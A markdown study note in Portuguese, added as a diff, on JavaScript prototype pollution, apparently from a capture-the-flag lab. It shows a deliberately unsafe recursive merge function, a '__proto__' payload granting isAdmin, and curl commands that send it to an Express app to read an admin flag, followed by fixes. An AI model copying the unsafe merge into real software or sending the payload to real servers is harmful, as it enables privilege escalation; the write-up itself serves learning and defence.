@@ -1,0 +1,188 @@
+# Prototype Pollution (Poluição de Protótipo)
+
+## O que é?
+
+Prototype Pollution é uma vulnerabilidade do JavaScript onde um atacante consegue modificar o objeto base de todos os objetos:
+
+Object.prototype
+
+Como todos os objetos herdam dele, uma alteração pode afetar várias partes da aplicação.
+
+---
+
+# Como funciona?
+
+No JavaScript, objetos possuem uma cadeia de herança:
+
+usuario
+ |
+ v
+Object.prototype
+
+
+Exemplo:
+
+```javascript
+const user = {};
+
+console.log(user.toString);
+
+Mesmo sem criar toString, ele existe porque vem de Object.prototype.
+
+Onde nasce a vulnerabilidade?
+
+Normalmente em funções que fazem merge de objetos sem validar os campos recebidos.
+
+Exemplo vulnerável:
+
+function merge(target, source) {
+  for (let key in source) {
+
+    if (typeof source[key] === 'object') {
+      if (!target[key]) target[key] = {};
+
+      merge(target[key], source[key]);
+
+    } else {
+      target[key] = source[key];
+    }
+  }
+
+  return target;
+}
+
+O problema:
+
+A aplicação aceita qualquer chave enviada pelo usuário.
+
+Exploração
+
+Payload:
+
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+A aplicação pensa:
+
+"Vou adicionar isso ao usuário"
+
+Mas na verdade altera:
+
+Object.prototype.isAdmin = true
+
+Agora qualquer objeto pode herdar:
+
+isAdmin = true
+Exemplo do impacto
+
+Antes:
+
+currentUser = {
+    name: "Alice"
+}
+
+currentUser.isAdmin
+
+false
+
+Depois da poluição:
+
+Object.prototype.isAdmin = true
+
+Agora:
+
+currentUser.isAdmin
+
+true
+
+O usuário comum pode virar administrador.
+
+Como detectar?
+
+Procure aplicações JavaScript que:
+
+usam Node.js
+usam Express.js
+recebem JSON do usuário
+fazem atualização de objetos
+possuem funções como:
+merge()
+extend()
+clone()
+assign()
+update()
+Fingerprint da aplicação
+
+Exemplo:
+
+curl -I IP:3000
+
+Resposta:
+
+X-Powered-By: Express
+Set-Cookie: connect.sid=xxxxx
+
+Indica:
+
+Backend Express
+Sessão usando express-session
+Testando a vulnerabilidade
+
+Primeiro salvar o cookie:
+
+curl -c cookies.txt http://IP:3000/
+
+Testar rota administrativa:
+
+curl -b cookies.txt http://IP:3000/api/admin/flag
+
+Resposta esperada:
+
+{
+"error":"Not authorized"
+}
+Enviando o payload
+curl -b cookies.txt \
+-X POST http://IP:3000/api/user/update \
+-H "Content-Type: application/json" \
+-d '{"__proto__":{"isAdmin":true}}'
+
+Resposta:
+
+{
+"status":"updated"
+}
+
+Agora:
+
+Object.prototype.isAdmin = true
+Pegando a flag
+
+Enviar novamente:
+
+curl -b cookies.txt http://IP:3000/api/admin/flag
+
+Se funcionar:
+
+{
+"flag":"THM{xxxxxxxx}"
+}
+
+A flag aparece na resposta.
+
+Como corrigir?
+
+Evitar misturar objetos diretamente com dados do usuário.
+
+Bloquear propriedades perigosas:
+
+__proto__
+constructor
+prototype
+
+Validar todos os campos recebidos.
+
+Evitar funções de merge inseguras.
